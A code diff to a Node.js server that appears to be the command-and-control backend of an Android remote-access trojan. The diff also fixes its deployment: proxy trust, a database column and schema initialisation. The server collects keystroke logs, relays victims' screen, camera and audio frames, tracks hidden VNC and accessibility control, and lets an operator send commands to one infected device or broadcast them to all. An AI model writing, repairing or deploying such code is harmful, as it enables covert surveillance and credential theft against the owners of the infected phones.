@@ -7,7 +7,6 @@ const http    = require('http');
 const WebSocket = require('ws');
 const cors    = require('cors');
 const jwt     = require('jsonwebtoken');
-const { v4: uuidv4 } = require('uuid');
 const db      = require('./db/database');
 const authRoutes    = require('./routes/auth');
 const builderRoutes = require('./routes/builder');
@@ -21,10 +20,10 @@ const JWT_SECRET    = process.env.JWT_SECRET    || 'changeme';
 const FRONTEND_DIST = path.join(__dirname, '..', 'frontend', 'dist');
 
 // Connection health tuning
-const PING_INTERVAL_MS  = 18_000;   // How often to send protocol pings
-const PONG_TIMEOUT_MS   = 60_000;   // How long before a non-responsive socket is reaped
-const AUTH_TIMEOUT_MS   = 15_000;   // How long a device has to register before close
-const DEVICE_IDLE_REAP  = 90_000;   // Reap device if no message for 90s (ping counts)
+const PING_INTERVAL_MS  = 18_000;
+const PONG_TIMEOUT_MS   = 60_000;
+const AUTH_TIMEOUT_MS   = 15_000;
+const DEVICE_IDLE_REAP  = 90_000;
 
 // Frame forwarding
 const FRAME_TYPE_SCREEN = 0x01;
@@ -34,6 +33,7 @@ const FRAME_TYPE_AUDIO  = 0x03;
 // ── Express ────────────────────────────────────────────────────────────────────
 
 const app = express();
+app.set('trust proxy', 1);  // FIX: trust Render's reverse proxy for req.protocol / req.ip
 app.use(cors({ origin: '*', credentials: true }));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: false }));
@@ -41,17 +41,12 @@ app.use(express.urlencoded({ extended: false }));
 const server = http.createServer(app);
 
 // ── WebSocket servers ──────────────────────────────────────────────────────────
-// /ws    → Android devices
-// /panel → Operator panel (browser)
 
 const deviceWss = new WebSocket.Server({ noServer: true, maxPayload: 64 * 1024 * 1024 });
 const panelWss  = new WebSocket.Server({ noServer: true, maxPayload:  4 * 1024 * 1024 });
 
 // Registry
-// deviceId → { ws, ip, info, connectedAt, lastMsg, pingTs, pongTs, missedPings }
 const devices = new Map();
-
-// panel ws → { authed, lastMsg, pingTs, pongTs, missedPings }
 const panels  = new Map();
 
 // ── HTTP upgrade routing ────────────────────────────────────────────────────────
@@ -109,13 +104,11 @@ function startKeepalive() {
   setInterval(() => {
     const now = Date.now();
 
-    // Ping devices
     for (const [id, entry] of devices) {
       if (entry.ws.readyState !== WebSocket.OPEN) { devices.delete(id); continue; }
 
       const timeSinceMsg = now - entry.lastMsg;
 
-      // Reap if completely silent
       if (timeSinceMsg > DEVICE_IDLE_REAP && entry.missedPings >= 3) {
         console.log(`[DEVICE] Reaping dead device ${id} (${entry.missedPings} missed pings)`);
         entry.ws.terminate();
@@ -124,7 +117,6 @@ function startKeepalive() {
         continue;
       }
 
-      // Ping
       try {
         entry.ws.ping();
         entry.missedPings++;
@@ -135,7 +127,6 @@ function startKeepalive() {
       }
     }
 
-    // Ping panels
     for (const [ws, meta] of panels) {
       if (ws.readyState !== WebSocket.OPEN) { panels.delete(ws); continue; }
 
@@ -157,7 +148,6 @@ function startKeepalive() {
   }, PING_INTERVAL_MS).unref();
 }
 
-// Pong handlers
 deviceWss.on('pong', ws => {
   for (const entry of devices.values()) {
     if (entry.ws === ws) {
@@ -198,12 +188,9 @@ deviceWss.on('connection', (ws, req) => {
     }
   }, AUTH_TIMEOUT_MS);
 
-  // ── Message handler ───────────────────────────────────────────────────────
-
   ws.on('message', async (data, isBinary) => {
     if (!deviceId) return;
 
-    // Update last-message timestamp
     const entry = devices.get(deviceId);
     if (entry) { entry.lastMsg = Date.now(); entry.missedPings = 0; }
 
@@ -220,14 +207,12 @@ deviceWss.on('connection', (ws, req) => {
           frameType !== FRAME_TYPE_CAMERA &&
           frameType !== FRAME_TYPE_AUDIO) return;
 
-      // Build forwarded frame: [frameType:1][devIdLen:2][devId:UTF8][payload]
       const devIdBuf = Buffer.from(deviceId, 'utf8');
       const hdr      = Buffer.allocUnsafe(3);
       hdr[0]         = frameType;
       hdr.writeUInt16BE(devIdBuf.length, 1);
       toAllPanelsBinary(Buffer.concat([hdr, devIdBuf, payload]));
 
-      // Throttle last_seen DB writes
       if (!ws._lsUpdate || Date.now() - ws._lsUpdate > 10_000) {
         ws._lsUpdate = Date.now();
         db.query('UPDATE devices SET last_seen=NOW() WHERE id=$1', [deviceId]).catch(() => {});
@@ -244,11 +229,9 @@ deviceWss.on('connection', (ws, req) => {
     const t = msg.type || msg.cmd || '';
 
     switch (t) {
-      // Device registration
       case 'DEVICE_INFO': {
         if (registered) break;
 
-        // Verify secret if configured
         if (DEVICE_SECRET && msg.secret !== DEVICE_SECRET) {
           ws.close(4003, 'bad_secret');
           clearTimeout(authTimer);
@@ -270,9 +253,9 @@ deviceWss.on('connection', (ws, req) => {
           missedPings: 0,
         });
 
-        // Upsert device record
+        // FIX: use created_at (schema column) instead of first_seen
         await db.query(`
-          INSERT INTO devices (id, ip, manufacturer, model, android_version, alias, online, first_seen, last_seen)
+          INSERT INTO devices (id, ip, manufacturer, model, android_version, alias, online, created_at, last_seen)
           VALUES ($1,$2,$3,$4,$5,$6,true,$7,$7)
           ON CONFLICT (id) DO UPDATE SET
             ip=$2, manufacturer=$3, model=$4, android_version=$5,
@@ -287,13 +270,11 @@ deviceWss.on('connection', (ws, req) => {
           now,
         ]).catch(e => console.error('[DB] upsert error:', e));
 
-        // Save raw info blob
         await db.query(
           'INSERT INTO device_info (device_id, info, captured_at) VALUES ($1,$2,$3)',
           [deviceId, JSON.stringify(info), now]
         ).catch(() => {});
 
-        // Notify all panels
         toAllPanels({
           type:      'device_online',
           deviceId,
@@ -307,7 +288,6 @@ deviceWss.on('connection', (ws, req) => {
         break;
       }
 
-      // Keylog batch
       case 'KEYLOG':
       case 'keylog': {
         if (!deviceId) break;
@@ -319,7 +299,6 @@ deviceWss.on('connection', (ws, req) => {
         break;
       }
 
-      // Battery update
       case 'BATTERY':
       case 'battery_update': {
         const lvl = msg.level ?? msg.battery_level ?? -1;
@@ -328,36 +307,29 @@ deviceWss.on('connection', (ws, req) => {
         break;
       }
 
-      // Permission update
       case 'PERMISSIONS':
       case 'permission_update': {
         toAllPanels({ type: 'permission_update', deviceId, permissions: msg.permissions || {} });
         break;
       }
 
-      // HVNC status
       case 'SILENT_VNC_STATUS':
       case 'VNC_STATUS': {
         toAllPanels({ type: 'vnc_status', deviceId, active: !!msg.active, method: msg.method || 'silent' });
         break;
       }
 
-      // Accessibility status
       case 'ACCESSIBILITY_STATUS': {
         toAllPanels({ type: 'accessibility_status', deviceId, active: !!msg.active });
         break;
       }
 
-      // Command response passthrough
       default: {
-        // Everything else forwarded to all panels with device context
         toAllPanels({ ...msg, _from: deviceId });
         break;
       }
     }
   });
-
-  // ── Error / close ──────────────────────────────────────────────────────────
 
   ws.on('error', err => {
     console.error(`[DEVICE] WS error ${deviceId}:`, err.message);
@@ -386,7 +358,6 @@ panelWss.on('connection', (ws, req) => {
   };
   panels.set(ws, meta);
 
-  // Require JWT auth within 10s
   const authTimer = setTimeout(() => {
     if (!meta.authed) {
       ws.close(4001, 'no_auth');
@@ -406,15 +377,12 @@ panelWss.on('connection', (ws, req) => {
 
     const t = msg.type || '';
 
-    // ── Auth ────────────────────────────────────────────────────────────────
-
     if (t === 'auth') {
       try {
         jwt.verify(msg.token, JWT_SECRET);
         meta.authed = true;
         clearTimeout(authTimer);
 
-        // Send current device list
         const devList = [];
         for (const [id, entry] of devices) {
           devList.push({
@@ -435,8 +403,6 @@ panelWss.on('connection', (ws, req) => {
 
     if (!meta.authed) return;
 
-    // ── Command routing ────────────────────────────────────────────────────
-
     if (t === 'cmd' || t === 'command') {
       const { deviceId, cmd } = msg;
       if (!deviceId || !cmd) return;
@@ -452,7 +418,6 @@ panelWss.on('connection', (ws, req) => {
       return;
     }
 
-    // Get all devices list
     if (t === 'list_devices') {
       const devList = [];
       for (const [id, entry] of devices) {
@@ -462,7 +427,6 @@ panelWss.on('connection', (ws, req) => {
       return;
     }
 
-    // Get keylogs for device
     if (t === 'get_keylogs') {
       const { deviceId, limit = 500 } = msg;
       try {
@@ -477,7 +441,6 @@ panelWss.on('connection', (ws, req) => {
       return;
     }
 
-    // Broadcast to all devices (bulk command)
     if (t === 'broadcast_cmd') {
       const { cmd } = msg;
       if (!cmd) return;
@@ -503,15 +466,13 @@ panelWss.on('connection', (ws, req) => {
 app.use('/api/auth', authRoutes);
 app.use('/api/builder', authMiddleware, builderRoutes);
 
-// Device list REST endpoint
 app.get('/api/devices', authMiddleware, async (req, res) => {
   try {
     const rows = await db.query(
       `SELECT id, ip, manufacturer, model, android_version, alias,
-              online, first_seen, last_seen
+              online, created_at, last_seen
        FROM devices ORDER BY last_seen DESC LIMIT 500`
     );
-    // Merge with live WS data
     const live = new Set([...devices.keys()]);
     const result = rows.rows.map(r => ({
       ...r,
@@ -524,7 +485,6 @@ app.get('/api/devices', authMiddleware, async (req, res) => {
   }
 });
 
-// Device keylogs REST
 app.get('/api/devices/:id/keylogs', authMiddleware, async (req, res) => {
   const { id } = req.params;
   const limit  = parseInt(req.query.limit || '1000', 10);
@@ -537,7 +497,6 @@ app.get('/api/devices/:id/keylogs', authMiddleware, async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Send command via REST (useful for scripting)
 app.post('/api/devices/:id/cmd', authMiddleware, (req, res) => {
   const { id } = req.params;
   const cmd = req.body;
@@ -549,7 +508,8 @@ app.post('/api/devices/:id/cmd', authMiddleware, (req, res) => {
 
 // Static frontend
 app.use(express.static(FRONTEND_DIST));
-app.get('*', (_, res) => res.sendFile(path.join(FRONTEND_DIST, 'index.html')));
+// FIX: regex wildcard — compatible with Express 4 and 5
+app.get(/.*/, (_, res) => res.sendFile(path.join(FRONTEND_DIST, 'index.html')));
 
 // Health check
 app.get('/health', (_, res) => res.json({
@@ -561,11 +521,19 @@ app.get('/health', (_, res) => res.json({
 
 // ── Boot ────────────────────────────────────────────────────────────────────────
 
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`[SERVER] Listening on :${PORT}`);
-  console.log(`[SERVER] Devices: ws://0.0.0.0:${PORT}/ws`);
-  console.log(`[SERVER] Panel:   ws://0.0.0.0:${PORT}/panel`);
-});
+// FIX: initialize DB schema before accepting traffic
+db.init()
+  .then(() => {
+    server.listen(PORT, '0.0.0.0', () => {
+      console.log(`[SERVER] Listening on :${PORT}`);
+      console.log(`[SERVER] Devices: ws://0.0.0.0:${PORT}/ws`);
+      console.log(`[SERVER] Panel:   ws://0.0.0.0:${PORT}/panel`);
+    });
+  })
+  .catch(e => {
+    console.error('[DB] Fatal init error:', e);
+    process.exit(1);
+  });
 
 server.on('error', err => {
   console.error('[SERVER] Fatal:', err);
